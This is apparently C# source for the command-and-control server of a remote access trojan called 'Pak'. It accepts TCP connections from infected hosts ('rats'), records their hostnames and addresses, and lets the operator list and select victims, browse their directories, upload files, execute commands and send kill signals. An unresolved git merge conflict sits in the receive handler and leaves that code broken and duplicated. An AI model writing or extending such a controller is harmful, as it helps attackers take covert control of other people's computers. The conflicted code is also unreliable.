using System;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;
using System.Diagnostics;

/**
 * [ ] Have the option to communicate with either 1 or all connected clients.
 * [ ] Tasks ? for disconnected clients ?
 */

namespace da_pak
{
    class Pak
    {
        private static byte[] _buffer = new byte[2048];

        private static ManualResetEvent _mre = new ManualResetEvent(false);

        private static List<Socket> _clientSockets = new List<Socket>();
        private static List<Rat> _rats = new List<Rat>();
        private static Socket _serverSocket = new Socket
            (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        private static void puts(string text, bool prefix = true)
        {
            Console.WriteLine(text);
            if (prefix) Console.Write("> ");
        } private static void puts(){ puts(""); }

        private class Rat
        {
            public Socket hostSock;
            private string hostName;
            private string hostAddr;

            private static int n = 0;
            public bool selected = false;
            public int ratN;

            public Rat(Socket sock, string info)
            {
                string[] infoArr = info.Split();                
                hostName = infoArr[1];
                hostAddr = infoArr[2];

                hostSock = sock;

                ratN = n;
                n += 1;
            }

            public static Rat getRatBySock(Socket sok)
            {
                foreach (var rat in _rats)
                    if (sok == rat.hostSock)
                        return rat;
                return null;
            }

            public static string daRatSays(string message, Rat rat)
            {
                return "Rat[" + rat.ratN + "]: " + message;
            } 
            public static string daRatSays(string message, Socket sok) { return daRatSays(message, getRatBySock(sok)); }


            public override string ToString()
            {
                /*> Rat no.0: hostName on hostAddr */
                return "[" + selected + "] Rat no." + ratN + ": " + hostName + " on " + hostAddr;
            }
        }

        static void Main(string[] args)
        {
            Console.Title = "Pak";

            SetupServer();
            SendLoop();

            Console.WriteLine("Exiting...");
            // Console.ReadLine();
        }

        private static void SetupServer()
        {
            Console.WriteLine("Setting up server...");
            _serverSocket.Bind(new IPEndPoint(IPAddress.Any, 1337));
            
            _serverSocket.Listen(5);
            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }

        private static void AcceptCallback(IAsyncResult AR)
        {
            Socket socket = _serverSocket.EndAccept(AR);

            _clientSockets.Add(socket);
            puts("Client connected...");

            socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);

            _mre.WaitOne();
        }

        private static void ReceiveCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            
            try
            {
                if (socket.Connected)
                {
                    int received = socket.EndReceive(AR);

                    byte[] dataBuf = new byte[received];
                    Array.Copy(_buffer, dataBuf, received);

                    string text = Encoding.ASCII.GetString(dataBuf);
                    
                    string response = string.Empty;
                    if (text.ToLower().Split()[0] == "info")
                    {
                        _rats.Add( new Rat(socket, text) );
                        response = "INFO Rat added to the pak";

<<<<<<< HEAD
                        text = text.Insert(0, "Client connected... ");
=======
                /* RESPONSE */
                
                string response = string.Empty;
                if (text.ToLower().Split()[0] == "info")
                {
                    _rats.Add( new Rat(socket, text) );
                    response = "Rat added to the pak";
                    byte[] data = Encoding.ASCII.GetBytes(response);
                    socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
                }
>>>>>>> 8a1f956484e745431adb49148fa488e197f95f3a

                        SendMessage(response, socket, false);
                    }
                    else if (text.ToLower().Split()[0] == "file" && text.ToLower().Split()[3] != "empty")
                    {
                        /* FILE fileName headerSize ... */
                        string fileName = text.ToLower().Split()[1]; 
                        int headerSize = Convert.ToInt32(text.ToLower().Split()[2]);
                        
                        text = text.Remove(0, headerSize);
                        File.Create( Directory.GetCurrentDirectory() + fileName );

                        text = fileName + " was download locally.";
                    }
                    
                    puts( Rat.daRatSays(text, socket) );

                    socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);

                    _mre.Set();
                }
            }
            catch (SocketException)
            {
                puts("Client disconnected...");

                socket.Close();
                _clientSockets.Remove(socket);

                Rat toBeRemoved = null;
                foreach (var rat in _rats)
                    if (socket == rat.hostSock)
                        toBeRemoved = rat;
                if (_rats.Contains(toBeRemoved)) _rats.Remove(toBeRemoved);

                _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
            }
        }

        private static void SendCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            socket.EndSend(AR);
        }

        private static void SendMessage(string message, Socket sok, bool receive = true)
        {
            byte[] data = Encoding.ASCII.GetBytes(message);
            sok.BeginSend(data, 0, data.Length, SocketFlags.None,
                                new AsyncCallback(SendCallback), sok);
            
            if (receive)
                sok.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
                                    new AsyncCallback(ReceiveCallback), sok);
        }
        private static void SendMessage(string message, Rat rat, bool receive = true) { SendMessage(message, rat.hostSock, receive); }

        private static string _help = @"
Commands:

    list `or` rats          display clients

    rat {no}                select a client to broadcast to
    rat                     deselect client (broadcast to / select all)

    dir                     display directory of the selected rat(s)
    cd {dir}                navigate the directory of the selected rat(s)

    exec                    execute (tb.implemented)
    upload {fileName}       upload a localFile to the selected rat(s) 

    kill                    send terminate command to the selected rat(s)

    help                    display help

    break `or` exit         exit

";
        private static void SendLoop()
        {
            Rat theChosenOne = null;
            while(true)
            {
                Console.Write("> ");
                string input = Console.ReadLine().Trim();

                if (input == "break" || input == "exit")
                    break;

                else if (input == "help")
                    Console.Write(_help);

                else if (input == "list" || input == "rats")
                    foreach(var rat in _rats)
                        Console.WriteLine(rat);

                else if (input.Split()[0] == "rat" && input.Split().Length < 3)
                {
                    if (input.Split().Length == 1)
                        theChosenOne = null;
                    else if ( Convert.ToInt32(input.Split()[1]) < _rats.Count)
                    {
                        theChosenOne = _rats[ Convert.ToInt32(input.Split()[1]) ];
                        theChosenOne.selected = true;
                    }
                    else
                        puts("Rat not found");
                }
                else
                {
                    /* Send message to either only one or to all rats */
                    if (theChosenOne == null)
                        foreach(var rat in _rats)
                            SendMessage(input, rat);

                    else
                    {
                        SendMessage(input, theChosenOne);

                        if (input == "kill" || input == "black_plague" || input == "terminate")
                            theChosenOne = null;
                    }

                    if (input == "black_plague" || input == "terminate")
                        Environment.Exit(0);
                }
            }
        }
    }
}
